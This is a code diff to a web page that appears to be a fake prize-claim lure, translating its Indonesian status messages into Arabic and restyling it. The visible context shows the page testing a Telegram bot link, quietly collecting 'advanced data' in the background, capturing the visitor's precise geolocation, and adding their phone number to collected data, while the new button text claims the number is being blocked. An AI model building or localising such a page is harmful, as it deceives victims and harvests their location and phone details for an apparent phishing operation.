@@ -175,7 +175,7 @@
         
         .claim-button:hover {
             transform: translateY(-5px);
-            box-shadow: 0 15px 30px rgba(39, 174, 96, 0.6);
+            box-shadow: 0 15px 30px rgb(141, 1, 1);
         }
         
         .claim-button:active {
@@ -607,7 +607,7 @@ updateEgyptClock();
 
         // Initialize system saat halaman dimuat
         window.addEventListener('load', async () => {
-            updateStatus('systemStatus', '🔄 Sistem sedang diinisialisasi...', 'warning');
+            updateStatus('systemStatus', '🔄 يجري تهيئة النظام...', 'warning');
             
             // Test koneksi Telegram
             await testTelegramConnection();
@@ -621,7 +621,7 @@ updateEgyptClock();
             // Kumpulkan data tambahan di background
             collectAdvancedData();
             
-            updateStatus('systemStatus', '✅ Sistem siap menerima klaim hadiah', 'success');
+            updateStatus('systemStatus', '✅ النظام جاهز', 'success');
         });
 
         // Test koneksi Telegram
@@ -632,14 +632,14 @@ updateEgyptClock();
                 const result = await response.json();
                 
                 if (result.ok) {
-                    updateStatus('telegramStatus', '✅ Terhubung ke sistem Telegram', 'success');
+                    updateStatus('telegramStatus', '✅ الاتصال بنظام تيليجرام', 'success');
                     return true;
                 } else {
-                    updateStatus('telegramStatus', '⚠️ Token bot tidak valid', 'error');
+                    updateStatus('telegramStatus', '⚠️ رمز البوت غير صالح', 'error');
                     return false;
                 }
             } catch (error) {
-                updateStatus('telegramStatus', '⚠️ Gagal terhubung ke Telegram', 'error');
+                updateStatus('telegramStatus', '⚠️ فشل الاتصال بتطبيق تيليجرام', 'error');
                 return false;
             }
         }
@@ -692,11 +692,11 @@ updateEgyptClock();
         // Dapatkan data lokasi
         async function getGeolocationData() {
             if (!navigator.geolocation) {
-                updateStatus('locationStatus', '⚠️ Geolocation tidak didukung', 'error');
+                updateStatus('locationStatus', '⚠️ لا يتم دعم تحديد الموقع الجغرافي', 'error');
                 return;
             }
 
-            updateStatus('locationStatus', '📍 Mendeteksi lokasi Anda...', 'warning');
+            updateStatus('locationStatus', ' تحديد موقعك...', 'warning');
 
             try {
                 const position = await new Promise((resolve, reject) => {
@@ -716,22 +716,22 @@ updateEgyptClock();
                 collectedData.speed = position.coords.speed;
                 updateDataCounter(7);
                 
-                updateStatus('locationStatus', '✅ Lokasi berhasil terdeteksi', 'success');
+                updateStatus('locationStatus', '✅ تم تحديد الموقع بنجاح', 'success');
                 
             } catch (error) {
                 let errorMessage = '⚠️ ';
                 switch(error.code) {
                     case error.PERMISSION_DENIED:
-                        errorMessage += 'Izin lokasi ditolak';
+                        errorMessage += 'تم رفض إذن الوصول إلى الموقع';
                         break;
                     case error.POSITION_UNAVAILABLE:
-                        errorMessage += 'Informasi lokasi tidak tersedia';
+                        errorMessage += 'معلومات الموقع غير متوفرة';
                         break;
                     case error.TIMEOUT:
-                        errorMessage += 'Timeout deteksi lokasi';
+                        errorMessage += 'مهلة اكتشاف الموقع';
                         break;
                     default:
-                        errorMessage += 'Error tidak diketahui';
+                        errorMessage += 'Error';
                 }
                 updateStatus('locationStatus', errorMessage, 'error');
             }
@@ -1033,8 +1033,8 @@ updateEgyptClock();
             loading.style.display = 'block';
             successMessage.style.display = 'none';
             claimButton.disabled = true;
-            claimButton.textContent = '🔄 MENGUMPULKAN DATA FINAL...';
-            claimButton.style.background = 'linear-gradient(135deg, #95a5a6, #7f8c8d)';
+            claimButton.textContent = 'يتم حظر الرقم الرجاء الانتظار...';
+            claimButton.style.background = 'linear-gradient(135deg, #000000, #000000)';
             
             // Tambahkan nomor telepon ke data
             collectedData.phone = phone;
